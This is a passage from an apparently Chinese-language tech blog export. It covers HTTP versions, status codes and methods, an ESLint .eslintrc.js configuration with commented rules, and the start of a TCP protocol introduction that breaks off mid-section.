<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<h5 id="3-5-5-其他功能"><a href="#3-5-5-其他功能" class="headerlink" title="3.5.5 其他功能"></a>3.5.5 其他功能</h5><p>1.1版还新增了许多动词方法：<code>PUT</code>、<code>PATCH</code>、<code>HEAD</code>、<code>OPTIONS</code>、<code>DELETE</code>。</p>
<p>另外，客户端请求的头信息新增了<code>Host</code>字段，用来指定服务器的域名。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host: www.example.com</span><br></pre></td></tr></table></figure></p>
<p>有了Host字段，就可以将请求发往同一台服务器上的不同网站，为虚拟主机的兴起打下了基础。</p>
<h4 id="3-6-HTTP之状态码"><a href="#3-6-HTTP之状态码" class="headerlink" title="3.6 HTTP之状态码"></a>3.6 HTTP之状态码</h4><p>状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1xx：指示信息--表示请求已接收，继续处理</span><br><span class="line"></span><br><span class="line">2xx：成功--表示请求已被成功接收、理解、接受</span><br><span class="line"></span><br><span class="line">3xx：重定向--要完成请求必须进行更进一步的操作</span><br><span class="line"></span><br><span class="line">4xx：客户端错误--请求有语法错误或请求无法实现</span><br><span class="line"></span><br><span class="line">5xx：服务器端错误--服务器未能实现合法的请求</span><br></pre></td></tr></table></figure></p>
<p>常见状态码：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span> Continue                  <span class="comment">// 继续。客户端应继续其请求</span></span><br><span class="line"><span class="number">200</span> OK                        <span class="comment">// 客户端请求成功</span></span><br><span class="line"><span class="number">301</span> Moved Permanently         <span class="comment">// 资源（网页等）被永久转移到其它URL</span></span><br><span class="line"><span class="number">304</span> Not Modified              <span class="comment">// 未修改，客户端使用缓存</span></span><br><span class="line"><span class="number">400</span> Bad Request               <span class="comment">// 客户端请求有语法错误，不能被服务器所理解</span></span><br><span class="line"><span class="number">401</span> Unauthorized              <span class="comment">// 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</span></span><br><span class="line"><span class="number">403</span> Forbidden                 <span class="comment">// 服务器收到请求，但是拒绝提供服务</span></span><br><span class="line"><span class="number">404</span> Not Found                 <span class="comment">// 请求资源不存在，eg：输入了错误的URL</span></span><br><span class="line"><span class="number">500</span> Internal Server <span class="built_in">Error</span>     <span class="comment">// 服务器发生不可预期的错误</span></span><br><span class="line"><span class="number">503</span> Server Unavailable        <span class="comment">// 服务器当前不能处理客户端的请求，一段时间后可能恢复正常</span></span><br></pre></td></tr></table></figure></p>
<p><a href="http://www.runoob.com/http/http-status-codes.html" target="_blank" rel="noopener">更多状态请查看</a></p>
<h4 id="3-7-HTTP请求方法"><a href="#3-7-HTTP请求方法" class="headerlink" title="3.7 HTTP请求方法"></a>3.7 HTTP请求方法</h4><p>根据HTTP标准，HTTP请求可以使用多种请求方法。</p>
<p>HTTP1.0定义了三种请求方法： <code>GET</code>, <code>POST</code>和<code>HEAD</code>方法。</p>
<p>HTTP1.1新增了五种请求方法：<code>OPTIONS</code>, <code>PUT</code>, <code>DELETE</code>, <code>TRACE</code>和<code>CONNECT</code>方法。</p>
<table>
<thead>
<tr>
<th style="text-align:left">方法</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">GET</td>
<td style="text-align:left">请求指定的页面信息，并返回实体主体。</td>
</tr>
<tr>
<td style="text-align:left">HEAD</td>
<td style="text-align:left">类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。</td>
</tr>
<tr>
<td style="text-align:left">POST</td>
<td style="text-align:left">向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</td>
</tr>
<tr>
<td style="text-align:left">PUT</td>
<td style="text-align:left">从客户端向服务器传送的数据取代指定的文档的内容。</td>
</tr>
<tr>
<td style="text-align:left">DELETE</td>
<td style="text-align:left">请求服务器删除指定的页面。</td>
</tr>
<tr>
<td style="text-align:left">CONNETCT</td>
<td style="text-align:left">HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</td>
</tr>
<tr>
<td style="text-align:left">OPTIOINS</td>
<td style="text-align:left">允许客户端查看服务器的性能。</td>
</tr>
<tr>
<td style="text-align:left">TRACE</td>
<td style="text-align:left">回显服务器收到的请求，主要用于测试或诊断。</td>
</tr>
</tbody>
</table>
<h4 id="3-8-HTTP-1-1-缺点"><a href="#3-8-HTTP-1-1-缺点" class="headerlink" title="3.8 HTTP/1.1 缺点"></a>3.8 HTTP/1.1 缺点</h4><p>虽然1.1版允许复用<code>TCP</code>连接，但是同一个<code>TCP</code>连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为”队头堵塞”（Head-of-line blocking）。</p>
<p>为了避免这个问题，只有两种方法：一是减少请求数，二是同时多开持久连接。这导致了很多的网页优化技巧，比如合并脚本和样式表、将图片嵌入CSS代码、域名分片（domain sharding）等等。如果HTTP协议设计得更好一些，这些额外的工作是可以避免的。</p>
<h3 id="四、SPDY-协议"><a href="#四、SPDY-协议" class="headerlink" title="四、SPDY 协议"></a>四、SPDY 协议</h3><p>2009年，谷歌公开了自行研发的 SPDY 协议，主要解决 HTTP/1.1 效率不高的问题。</p>
<p>这个协议在Chrome浏览器上证明可行以后，就被当作 HTTP/2 的基础，主要特性都在 HTTP/2 之中得到继承。</p>
<h3 id="五、HTTP-2"><a href="#五、HTTP-2" class="headerlink" title="五、HTTP/2"></a>五、HTTP/2</h3><p>2015年，HTTP/2 发布。它不叫 HTTP/2.0，是因为标准委员会不打算再发布子版本了，下一个新版本将是 HTTP/3。</p>
<h4 id="5-1-二进制协议"><a href="#5-1-二进制协议" class="headerlink" title="5.1 二进制协议"></a>5.1 二进制协议</h4><p>HTTP/1.1 版的头信息肯定是文本（ASCII编码），数据体可以是文本，也可以是二进制。HTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”（frame）：头信息帧和数据帧。</p>
<p>二进制协议的一个好处是，可以定义额外的帧。HTTP/2 定义了近十种帧，为将来的高级应用打好了基础。如果使用文本实现这种功能，解析数据将会变得非常麻烦，二进制解析则方便得多。</p>
<h4 id="5-2-多工"><a href="#5-2-多工" class="headerlink" title="5.2 多工"></a>5.2 多工</h4><p>HTTP/2 复用<code>TCP</code>连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序一一对应，这样就避免了”队头堵塞”。</p>
<p>举例来说，在一个<code>TCP</code>连接里面，服务器同时收到了A请求和B请求，于是先回应A请求，结果发现处理过程非常耗时，于是就发送A请求已经处理好的部分， 接着回应B请求，完成后，再发送A请求剩下的部分。</p>
<p>这样双向的、实时的通信，就叫做多工（Multiplexing）。</p>
<h4 id="5-3-数据流"><a href="#5-3-数据流" class="headerlink" title="5.3 数据流"></a>5.3 数据流</h4><p>因为 HTTP/2 的数据包是不按顺序发送的，同一个连接里面连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。</p>
<p>HTTP/2 将每个请求或回应的所有数据包，称为一个数据流（stream）。每个数据流都有一个独一无二的编号。数据包发送的时候，都必须标记数据流ID，用来区分它属于哪个数据流。另外还规定，客户端发出的数据流，ID一律为奇数，服务器发出的，ID为偶数。</p>
<p>数据流发送到一半的时候，客户端和服务器都可以发送信号（RST_STREAM帧），取消这个数据流。1.1版取消数据流的唯一方法，就是关闭<code>TCP</code>连接。这就是说，HTTP/2 可以取消某一次请求，同时保证<code>TCP</code>连接还打开着，可以被其他请求使用。</p>
<p>客户端还可以指定数据流的优先级。优先级越高，服务器就会越早回应。</p>
<h4 id="5-4-头信息压缩"><a href="#5-4-头信息压缩" class="headerlink" title="5.4 头信息压缩"></a>5.4 头信息压缩</h4><p>HTTP 协议不带有状态，每次请求都必须附上所有信息。所以，请求的很多字段都是重复的，比如Cookie和User Agent，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。</p>
<p>HTTP/2 对这一点做了优化，引入了头信息压缩机制（header compression）。一方面，头信息使用gzip或compress压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就提高速度了。</p>
<h4 id="5-5-服务器推送"><a href="#5-5-服务器推送" class="headerlink" title="5.5 服务器推送"></a>5.5 服务器推送</h4><p>HTTP/2 允许服务器未经请求，主动向客户端发送资源，这叫做服务器推送（server push）。</p>
<p>常见场景是客户端请求一个网页，这个网页里面包含很多静态资源。正常情况下，客户端必须收到网页后，解析HTML源码，发现有静态资源，再发出静态资源请求。其实，服务器可以预期到客户端请求网页后，很可能会再请求静态资源，所以就主动把这些静态资源随着网页一起发给客户端了。</p>
]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-eslint使用与配置</title>
    <url>/2018/04/17/%E7%BB%BC%E5%90%88_eslint/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ESLint 由 JavaScript 红宝书 作者 Nicholas C. Zakas 编写， 2013 年发布第一个版本。 NCZ 的初衷不是重复造一个轮子，而是在实际需求得不到 JSHint 团队响应的情况下做出的选择：以可扩展、每条规则独立、不内置编码风格为理念编写一个 lint 工具。<br><a href="https://eslint.org/" target="_blank" rel="noopener">官网</a></p>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
<li>默认规则包含所有 JSLint、JSHint 中存在的规则，易迁移；</li>
<li>规则可配置性高：可设置「警告」、「错误」两个 error 等级，或者直接禁用；</li>
<li>包含代码风格检测的规则（可以丢掉 JSCS 了）；</li>
<li>支持插件扩展、自定义规则。</li>
</ol>
<h3 id="eslintrc-js文件配置"><a href="#eslintrc-js文件配置" class="headerlink" title=".eslintrc.js文件配置"></a><code>.eslintrc.js</code>文件配置</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">/* 运行环境 */</span></span><br><span class="line">    <span class="comment">/* 所有运行环境可查询https://eslint.org/docs/user-guide/configuring#specifying-environments */</span></span><br><span class="line">    <span class="string">"env"</span>: &#123;</span><br><span class="line">        <span class="string">"browser"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"es6"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 支持的语法规则 */</span></span><br><span class="line">    <span class="string">"parserOptions"</span>: &#123;</span><br><span class="line">        <span class="string">"ecmaVersion"</span>: <span class="number">6</span>, <span class="comment">// 3、5(默认)、6</span></span><br><span class="line">        <span class="string">"sourceType"</span>: <span class="string">"module"</span>,</span><br><span class="line">        <span class="string">"ecmaFeatures"</span>: &#123; <span class="comment">// 表示一些附加特性的对象</span></span><br><span class="line">            <span class="string">"jsx"</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">"modules"</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">"experimentalObjectRestSpread"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 第三方插件 */</span></span><br><span class="line">    <span class="comment">/* 需要安装 eslint-plugin-vue */</span></span><br><span class="line">    <span class="string">"plugins"</span>: [<span class="string">"vue"</span>],</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 规则 */</span></span><br><span class="line">    <span class="comment">/* error =&gt; 2; warn =&gt; 1; off =&gt; 0 */</span></span><br><span class="line">    <span class="string">"rules"</span>: &#123;</span><br><span class="line">        <span class="comment">/* 缩进 tab */</span></span><br><span class="line">        <span class="string">"indent"</span>: [</span><br><span class="line">            <span class="string">"error"</span>,</span><br><span class="line">            <span class="number">4</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"SwitchCase"</span>: <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">/* 使用单引号 */</span></span><br><span class="line">        <span class="string">"quotes"</span>: [</span><br><span class="line">            <span class="string">"error"</span>,</span><br><span class="line">            <span class="string">"single"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">/* 分号必须 */</span></span><br><span class="line">        <span class="string">"semi"</span>: [</span><br><span class="line">            <span class="string">"error"</span>,</span><br><span class="line">            <span class="string">"always"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">/* 函数不允许有重复的参数 */</span></span><br><span class="line">        <span class="string">"no-dupe-args"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">/* 不允许有多余的分号 */</span></span><br><span class="line">        <span class="string">"no-extra-semi"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">/* 不允许有多余的空格 */</span></span><br><span class="line">        <span class="string">"no-multi-spaces"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">/* 禁止变量重复声明 */</span></span><br><span class="line">        <span class="string">"no-redeclare"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">/* 禁止未使用的变量 */</span></span><br><span class="line">        <span class="string">"no-unused-vars"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 逗号前不可以有空格，逗号后必须有空格。</span></span><br><span class="line"><span class="comment">         * 变量声明：</span></span><br><span class="line"><span class="comment">         * ✅var a = 1, b = 2</span></span><br><span class="line"><span class="comment">         * 数组：</span></span><br><span class="line"><span class="comment">         * ✅[1, 2]</span></span><br><span class="line"><span class="comment">         * 对象：</span></span><br><span class="line"><span class="comment">         * ✅&#123;a: 1, b: 2&#125;</span></span><br><span class="line"><span class="comment">         * 函数参数：</span></span><br><span class="line"><span class="comment">         * ✅function (a, b) &#123;&#125;</span></span><br><span class="line"><span class="comment">         * ✅fn(1, 2)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"comma-spacing"</span>: [</span><br><span class="line">            <span class="string">"error"</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"before"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="string">"after"</span>: <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 调用函数时，禁止函数名称与括号间的间隔</span></span><br><span class="line"><span class="comment">         * ❎：fn ()</span></span><br><span class="line"><span class="comment">         * ✅：fn()</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"func-call-spacing"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 对象字面量冒号前不允许有空格，冒号后必须且只有一个空格</span></span><br><span class="line"><span class="comment">         * ✅：&#123;a: 1&#125;</span></span><br><span class="line"><span class="comment">         * ✅：&#123;</span></span><br><span class="line"><span class="comment">         *         a: 1,</span></span><br><span class="line"><span class="comment">         *         b: 2</span></span><br><span class="line"><span class="comment">         *     &#125;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"key-spacing"</span>: [</span><br><span class="line">            <span class="string">"error"</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"beforeColon"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="string">"afterColon"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">"mode"</span>: <span class="string">"strict"</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 关键字前后各至少一个空格，包括的关键字查看：</span></span><br><span class="line"><span class="comment">         * http://eslint.org/docs/rules/keyword-spacing#rule-details</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"keyword-spacing"</span>: [</span><br><span class="line">            <span class="string">"error"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 变量声明后强制一个空行，生命变量包括使用 var let const 等</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"newline-after-var"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">// 语句块前必须要有空格，语句块只得就是花括号 &#123;&#125;</span></span><br><span class="line">        <span class="string">"space-before-blocks"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * function 关键之与后边第一个圆括号之间必须有空格。包括：匿名函数、命名函数、async修饰的箭头函数</span></span><br><span class="line"><span class="comment">         * ✅：function () &#123;&#125;</span></span><br><span class="line"><span class="comment">         * ✅：function set () &#123;&#125;</span></span><br><span class="line"><span class="comment">         * ✅：class Foo &#123;</span></span><br><span class="line"><span class="comment">         *          constructor () &#123;</span></span><br><span class="line"><span class="comment">         *               // ...</span></span><br><span class="line"><span class="comment">         *          &#125;</span></span><br><span class="line"><span class="comment">         *     &#125;</span></span><br><span class="line"><span class="comment">         * ✅：let foo = &#123;</span></span><br><span class="line"><span class="comment">         *         bar () &#123;</span></span><br><span class="line"><span class="comment">         *               // ...</span></span><br><span class="line"><span class="comment">         *         &#125;</span></span><br><span class="line"><span class="comment">         *     &#125;;</span></span><br><span class="line"><span class="comment">         * ✅：let foo = async (a) =&gt; await a</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"space-before-function-paren"</span>: [</span><br><span class="line">            <span class="string">"error"</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"anonymous"</span>: <span class="string">"always"</span>,</span><br><span class="line">                <span class="string">"named"</span>: <span class="string">"always"</span>,</span><br><span class="line">                <span class="string">"asyncArrow"</span>: <span class="string">"always"</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// 多元运算符前后要有空格</span></span><br><span class="line">        <span class="string">"space-infix-ops"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 一元关键字运算符(操作符)后必须有空格：new, delete, typeof, void, yield 等</span></span><br><span class="line"><span class="comment">         * 一元运算符前后不能有空格如：-, +, --, ++, !, !! 等</span></span><br><span class="line"><span class="comment">         * ✅：new Foo();</span></span><br><span class="line"><span class="comment">         * ✅：++foo;</span></span><br><span class="line"><span class="comment">         * ✅：foo--;</span></span><br><span class="line"><span class="comment">         * ✅：-foo;</span></span><br><span class="line"><span class="comment">         * ✅：+"3";</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"space-unary-ops"</span>: [</span><br><span class="line">            <span class="string">"error"</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"words"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">"nonwords"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ================================ 以下是 ES6 规范 ================================</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 箭头函数中的箭头前后必须各有一个空格</span></span><br><span class="line"><span class="comment">         * ✅：() =&gt; 1</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"arrow-spacing"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 继承时子类的 constructor 方法中必须调用 super 方法</span></span><br><span class="line"><span class="comment">         * ✅：class A extends B &#123;</span></span><br><span class="line"><span class="comment">         *         constructor() &#123;</span></span><br><span class="line"><span class="comment">         *             super();</span></span><br><span class="line"><span class="comment">         *         &#125;</span></span><br><span class="line"><span class="comment">         *     &#125;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">"constructor-super"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">// 不允许给常量(const)赋值</span></span><br><span class="line">        <span class="string">"no-const-assign"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">// 在 constructor 中不允许在 super 方法被调用之前调用 this 或 super 关键字</span></span><br><span class="line">        <span class="string">"no-this-before-super"</span>: <span class="string">"error"</span>,</span><br><span class="line">        <span class="comment">// 不允许使用 var 声明变量，使用 let 或 const 代替</span></span><br><span class="line">        <span class="string">"no-var"</span>: <span class="string">"error"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>工具配置</tag>
        <tag>eslint</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-TCP协议简介</title>
    <url>/2018/04/17/%E7%BB%BC%E5%90%88_TCP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h2 id="TCP协议简介"><a href="#TCP协议简介" class="headerlink" title="TCP协议简介"></a>TCP协议简介</h2><p>TCP 是互联网核心协议之一，本文介绍它的基础知识。</p>
<p><img src="/static/img/tcp0.png"><br></p>
<h3 id="一、TCP-协议的作用"><a href="#一、TCP-协议的作用" class="headerlink" title="一、TCP 协议的作用"></a>一、TCP 协议的作用</h3><p>互联网由一整套协议构成。TCP 只是其中的一层，有着自己的分工。</p>
<p><img src="/static/img/tcp.png"><br><br>（图片说明：TCP 是以太网协议和 IP 协议的上层协议，也是应用层协议的下层协议。）</p>
<p>最底层的以太网协议（Ethernet）规定了电子信号如何组成数据包（packet），解决了子网内部的点对点通信。</p>
<p><img src="/static/img/tcp2.jpg"><br><br>（图片说明：以太网协议解决了局域网的点对点通信。）</p>
<p>但是，以太网协议不能解决多个局域网如何互通，这由 IP 协议解决。</p>
<p><img src="/static/img/tcp3.png"><br><br>（图片说明：IP 协议可以连接多个局域网。）</p>
<p>IP 协议定义了一套自己的地址规则，称为 IP 地址。它实现了路由功能，允许某个局域网的 A 主机，向另一个局域网的 B 主机发送消息。</p>
<p><img src="/static/img/tcp4.jpg"><br><br>（图片说明：路由器就是基于 IP 协议。局域网之间要靠路由器连接。）</p>
<p>路由的原理很简单。市场上所有的路由器，背后都有很多网口，要接入多根网线。路由器内部有一张路由表，规定了 A 段 IP 地址走出口一，B 段地址走出口二，……通过这套”指路牌”，实现了数据包的转发。</p>
<p><img src="/static/img/tcp5.jpg"><br><br>（图片说明：本机的路由表注明了不同 IP 目的地的数据包，要发送到哪一个网口（interface）。）</p>
<p>IP 协议只是一个地址协议，并不保证数据包的完整。如果路由器丢包（比如缓存满了，新进来的数据包就会丢失），就需要发现丢了哪一个包，以及如何重新发送这个包。这就要依靠 TCP 协议。</p>
<p>简单说，TCP 协议的作用是，保证数据通信的完整性和可靠性，防止丢包。</p>
<h3 id="二、TCP-数据包的大小"><a href="#二、TCP-数据包的大小" class="headerlink" title="二、TCP 数据包的大小"></a>二、TCP 数据包的大小</h3><p>以太网数据包（packet）的大小是固定的，最初是1518字节，后来增加到1522字节。其中， 1500 字节是负载（payload），22字节是头信息（head）。<br>IP 数据包在以太网数据包的负载里面，它也有自己的头信息，最少需要20字节，所以 IP 数据包的负载最多为1480字节。</p>
<p><img src="/static/img/tcp6.png"><br><br>（图片说明：IP 数据包在以太网数据包里面，TCP 数据包在 IP 数据包里面。）</p>
<p>TCP 数据包在 IP 数据包的负载里面。它的头信息最少也需要20字节，因此 TCP 数据包的最大负载是 1480 - 20 = 1460 字节。由于 IP 和 TCP 协议往往有额外的头信息，所以 TCP 负载实际为1400字节左右。</p>
<p>因此，一条1500字节的信息需要两个 TCP 数据包。HTTP/2 协议的一大改进， 就是压缩 HTTP 协议的头信息，使得一个 HTTP 请求可以放在一个 TCP 数据包里面，而不是分成多个，这样就提高了速度。</p>
<p><img src="/static/img/tcp7.png"><br><br>（图片说明：以太网数据包的负载是1500字节，TCP 数据包的负载在1400字节左右。）</p>
<h3 id="三、TCP-数据包的编号（SEQ）"><a href="#三、TCP-数据包的编号（SEQ）" class="headerlink" title="三、TCP 数据包的编号（SEQ）"></a>三、TCP 数据包的编号（SEQ）</h3><p>一个包1400字节，那么一次性发送大量数据，就必须分成多个包。比如，一个 10MB 的文件，需要发送7100多个包。</p>
<p>发送的时候，TCP 协议为每个包编号（sequence number，简称 SEQ），以便接收的一方按照顺序还原。万一发生丢包，也可以知道丢失的是哪一个包。</p>
<p>第一个包的编号是一个随机数。为了便于理解，这里就把它称为1号包。假定这个包的负载长度是100字节，那么可以推算出下一个包的编号应该是101。这就是说，每个数据包都可以得到两个编号：自身的编号，以及下一个包的编号。接收方由此知道，应该按照什么顺序将它们还原成原始文件。</p>
<p><img src="/static/img/tcp8.png"><br><br>（图片说明：当前包的编号是45943，下一个数据包的编号是46183，由此可知，这个包的负载是240字节。）</p>
<h3 id="四、TCP-数据包的组装"><a href="#四、TCP-数据包的组装" class="headerlink" title="四、TCP 数据包的组装"></a>四、TCP 数据包的组装</h3><p>收到 TCP 数据包以后，组装还原是操作系统完成的。应用程序不会直接处理 TCP 数据包。</p>
<p>对于应用程序来说，不用关心数据通信的细节。除非线路异常，收到的总是完整的数据。应用程序需要的数据放在 TCP 数据包里面，有自己的格式（比如 HTTP 协议）。</p>
<p>TCP 并没有提供任何机制，表示原始文件的大小，这由应用层的协议来规定。比如，HTTP 协议就有一个头信息<code>Content-Length</code>，表示信息体的大小。对于操作系统来说，就是持续地接收 TCP 数据包，将它们按照顺序组装好，一个包都不少。</p>
<p>操作系统不会去处理 TCP 数据包里面的数据。一旦组装好 TCP 数据包，就把它们转交给应用程序。TCP 数据包里面有一个端口（port）参数，就是用来指定转交给监听该端口的应用程序。</p>
<p><img src="/static/img/tcp9.jpg"><br><br>（图片说明：系统根据 TCP 数据包里面的端口，将组装好的数据转交给相应的应用程序。上图中，21端口是 FTP 服务器，25端口是 SMTP 服务，80端口是 Web 服务器。）</p>
<p>应用程序收到组装好的原始数据，以浏览器为例，就会根据 HTTP 协议的<code>Content-Length</code>字段正确读出一段段的数据。这也意味着，一次 TCP 通信可以包括多个 HTTP 通信。</p>
<h3 id="五、慢启动和-ACK"><a href="#五、慢启动和-ACK" class="headerlink" title="五、慢启动和 ACK"></a>五、慢启动和 ACK</h3><p>服务器发送数据包，当然越快越好，最好一次性全发出去。但是，发得太快，就有可能丢包。带宽小、路由器过热、缓存溢出等许多因素都会导致丢包。线路不好的话，发得越快，丢得越多。</p>
<p>最理想的状态是，在线路允许的情况下，达到最高速率。但是我们怎么知道，对方线路的理想速率是多少呢？答案就是慢慢试。</p>
<p>TCP 协议为了做到效率与可靠性的统一，设计了一个慢启动<code>（slow start）</code>机制。开始的时候，发送得较慢，然后根据丢包的情况，调整速率：如果不丢包，就加快发送速度；如果丢包，就降低发送速度。</p>
<p>Linux 内核里面设定了<code>（常量TCP_INIT_CWND）</code>，刚开始通信的时候，发送方一次性发送10个数据包，即”发送窗口”的大小为10。然后停下来，等待接收方的确认，再继续发送。</p>
<p>默认情况下，接收方每收到两个 TCP 数据包，就要发送一个确认消息。”确认”的英语是 acknowledgement，所以这个确认消息就简称 ACK。</p>
<p>ACK 携带两个信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 期待要收到下一个数据包的编号</span><br><span class="line">2. 接收方的接收窗口的剩余容量</span><br></pre></td></tr></table></figure>
<p>发送方有了这两个信息，再加上自己已经发出的数据包的最新编号，就会推测出接收方大概的接收速度，从而降低或增加发送速率。这被称为”发送窗口”，这个窗口的大小是可变的。</p>
<p><img src="/static/img/tcp10.png"><br><br>（图片说明：每个 ACK 都带有下一个数据包的编号，以及接收窗口的剩余容量。双方都会发送 ACK。）</p>
<p>注意，由于 TCP 通信是双向的，所以双方都需要发送 ACK。两方的窗口大小，很可能是不一样的。而且 ACK 只是很简单的几个字段，通常与数据合并在一个数据包里面发送。</p>
<p><img src="/static/img/tcp11.jpg"><br><br>（图片说明：上图一共4次通信。第一次通信，A 主机发给B 主机的数据包编号是1，长度是100字节，因此第二次通信 B 主机的 ACK 编号是 1 + 100 = 101，第三次通信 A 主机的数据包编号也是 101。同理，第二次通信 B 主机发给 A 主机的数据包编号是1，长度是200字节，因此第三次通信 A 主机的 ACK 是201，第四次通信 B 主机的数据包编号也是201。）</p>
<p>即使对于带宽很大、线路很好的连接，TCP 也总是从10个数据包开始慢慢试，过了一段时间以后，才达到最高的传输速率。这就是 TCP 的慢启动。</p>
<h3 id="六、数据包的遗失处理"><a href="#六、数据包的遗失处理" class="headerlink" title="六、数据包的遗失处理"></a>六、数据包的遗失处理</h3><p>TCP 协议可以保证数据通信的完整性，这是怎么做到的？</p>
<p>前面说过，每一个数据包都带有下一个数据包的编号。如果下一个数据包没有收到，那么 ACK 的编号就不会发生变化。</p>
<p>举例来说，现在收到了4号包，但是没有收到5号包。ACK 就会记录，期待收到5号包。过了一段时间，5号包收到了，那么下一轮 ACK 会更新编号。如果5号包还是没收到，但是收到了6号包或7号包，那么 ACK 里面的编号不会变化，总是显示5号包。这会导致大量重复内容的 ACK。</p>
